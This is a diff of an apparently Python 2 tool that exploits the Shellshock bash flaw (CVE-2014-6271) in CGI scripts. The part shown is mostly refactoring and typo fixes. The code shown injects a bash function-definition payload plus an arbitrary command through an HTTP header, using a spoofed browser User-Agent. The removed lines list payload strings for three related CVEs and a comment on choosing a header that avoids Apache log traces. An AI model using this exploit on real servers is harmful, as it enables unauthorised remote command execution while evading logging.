@@ -42,20 +42,8 @@ import Queue
 import threading
 import re
 from collections import OrderedDict
-
-
-# Dictionary {CVE ref: (header, exploit)} to try on discovered CGI scripts
-# Where attack string comprises exploit + success_flag + command
-# We use the Content-type header rather than User-agent as the latter
-# leaves an obvious trace in Apache's logs whilst the former doesn't...
-# Note - Currently only CVE-2014-6271 works
-attacks = {
-    "CVE-2014-6271": ("Content-type", "() { :;}; echo; %s"),
-    "CVE-2014-7169": ("Cotent-type", "'() { function a a>\' bash -c /tmp/echo"),
-    #"CVE-2014-6278": ("Content-type", "() { _; } >_[$($())] { %s; }"),
-    }
     
-# Wrapper object for sys.sdout to elimate buffering
+# Wrapper object for sys.sdout to eliminate buffering
 # (http://stackoverflow.com/questions/107705/python-output-buffering)
 class Unbuffered(object):
     def __init__(self, stream):
@@ -72,15 +60,15 @@ sys.stdout = Unbuffered(sys.stdout)
 
 # Dictionary {header:attack string} to try on discovered CGI scripts
 # Where attack string comprises exploit + success_flag + command
-attacks = [
+ATTACKS = [
    "() { %3a;}; echo; "
    ]
 
-# Timeout for attacks which do no provide an intereactive response
+# Timeout for attacks which do no provide an interactive response
 ATTACK_TIMEOUT = 20
 
 # User-agent to use instead of 'Python-urllib/2.6' or similar
-user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
+USER_AGENT = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
 
 # Handle CTRL-c elegently
 def signal_handler(signal, frame):
@@ -160,7 +148,7 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
                     req.set_proxy(proxy, "http")    
                 
                 # Pretend not to be Python for no particular reason
-                req.add_header("User-Agent", user_agent)
+                req.add_header("User-Agent", USER_AGENT)
 
                 # Set the host header correctly (Python includes :port)
                 req.add_header("Host", host)
@@ -225,7 +213,7 @@ def do_exploit_cgi(proxy, target_list, header, command, verbose):
     for target in target_list:
         if verbose: print "[+] Trying exploit for %s" % target 
         if verbose: print "[I] Flag set to: %s" % success_flag
-        for exploit in attacks:
+        for exploit in ATTACKS:
             attack = exploit + " echo " + success_flag + "; " + command
             result = do_attack(proxy, target, header, attack, verbose)
             if success_flag in result:
@@ -260,7 +248,7 @@ def do_attack(proxy, target, header, attack, verbose):
             print "[I] Attack string is: %s" % attack
         req = urllib2.Request(target)
         # User-Agent is overwritten if it is supplied as the attacker header
-        req.add_header("User-Agent", user_agent)
+        req.add_header("User-Agent", USER_AGENT)
         req.add_header(header, attack)
         if proxy:
             req.set_proxy(proxy, "http")    
